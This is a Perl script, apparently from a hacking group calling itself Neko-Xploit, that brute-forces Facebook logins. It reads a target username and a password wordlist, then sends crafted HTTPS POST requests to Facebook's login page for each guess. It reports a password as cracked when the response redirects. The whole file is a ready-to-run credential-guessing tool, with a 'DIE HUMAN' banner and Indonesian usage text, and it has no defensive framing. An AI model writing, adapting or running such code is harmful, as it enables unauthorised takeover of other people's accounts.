#!/usr/bin/perl
#No Label 
#Unknown :v
#Kimcil Hokya Hokya
#ape lu coeg :v 
#

use strict;
use Net::SSLeay::Handle;

system('cls');

if(!defined($ARGV[0] && $ARGV[1])) {

print "\n";
print "
\t\t\t\t\t\t\t\t\t\t \033[92m+-----------------------------------------------+ 
            .                                                      . \t\t | \033[94mAuthor  : \033[91mNeko-Xploit\033[0m\033[0m \t \033[92m                |\033[0m
\033[92m          .n                   .                 .                  n.\033[0m \t\t \033[92m|\033[0m \033[94mEditing : \033[91mAnja\033[0m\033[0m\033[0m \t \033[92m                        |\033[0m
\033[92m    .   .dP                  dP                   9b                 9b.    .\033[0m\033[0m \t \033[92m|\033[0m \033[94mSite    : \033[91m\033[4mhttps://facebook.com/otakuhacking  \033[0m\033[0m\033[0m \033[92m|\033[0m
\033[92m   4    qXb         .       dX                     Xb       .        dXp     t\033[0m \t \033[92m|\033[0m \033[94mVersion : \033[91m2.0\033[0m\033[0m\t\t \033[92m                |\033[0m
\033[92m  dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb\033[0m  \033[92m+-----------------------------------------------+\033[0m
\033[92m  9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP\033[0m \t  \033[1m\033[93m         Kimochi\033[91mSS4IT\033[0m\033[1m\033[93mTeam\033[0m\033[0m
   \033[92m9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP 
    `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP' 
      `9XXXXXXXXXXXP' `9XX'\033[0m   \033[1m\033[91mDIE\033[0m\033[0m    \033[92m`98v8P'\033[0m  \033[1m\033[91mHUMAN\033[0m\033[0m   \033[92m`XXP' `9XXXXXXXXXXXP' \033[0m
          \033[92m~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~\033[0m  
                          \033[92m)b.  .dbo.dP'`v'`9b.odb.  .dX(
                        ,dXXXXXXXXXXXb     dXXXXXXXXXXXb. 
                       dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                      dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                      9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                       `'      9XXXXXX(   )XXXXXXP      `'
                                XXXX X.`v'.X XXXX
                                XP^X'`b   d'`X^XX
                                X. 9  `   '  P )X
                                `b  `       '  d'

                                 `             '\033[0m
";

print "
\t\033[96m==================================================================\033[0m
\t\033[96m||\033[0m \033[95mCara Menggunakan\033[0m : \033[1;37mperl brf-acount.pl \033[94m[\033[0m\033[91musername\033[0m\033[94m]\033[0m \033[94m[\033[0m\033[91mwordlist\033[0m\033[94m]\033[0m \033[0m\033[96m ||\033[0m
\t\033[96m================================================================== \033[0m
\n";

exit; }
my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n";

print "\033[1;39m\n \033[94mCracking on user\033[0m : \033[95m$user \033[0m\n\n";
print "\t===================================================================\n";
print "\t\t\t\t\033[1m\033[93mBRUTEFORCE\033[0m\033[0m \033[1m\033[91mATTACKING\033[0m\033[0m \n";
print "\n";
print "\n";
print "\t    \033[94mStatus \t\t\t\t\t Password Crack\033[0m\n";
print "\t    ------ \t\t\t\t\t --------------\n";
while (my $password = <LIST>) {
	chomp ($password);
		$password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

		my $a = "POST /login.php HTTP/1.1";
		my $b = "Host: www.facebook.com";
		my $c = "Connection: close";
		my $e = "Cache-Control: max-age=0";
		my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		my $g = "Origin: https://www.facebook.com";
		my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
		my $i = "Content-Type: application/x-www-form-urlencoded";
		my $j = "Accept-Encoding: gzip,deflate,sdch";
		my $k = "Accept-Language: en-US,en;q=0.8";
		my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

		my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
		my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
		my $cl = length($post);
		my $d = "Content-Length: $cl";


		my ($host, $port) = ("www.facebook.com", 443);

			tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{
print "\033[1;31m\t[-] Failed \t\t\t\t\t $password \033[0m\n";
close SSL;
}
else
{
print "\t\033[1;32m[+] Success \t\t\t\t\t $password \033[0m\n";
print "\t===================================================================\n";
close SSL;
exit;
}
}
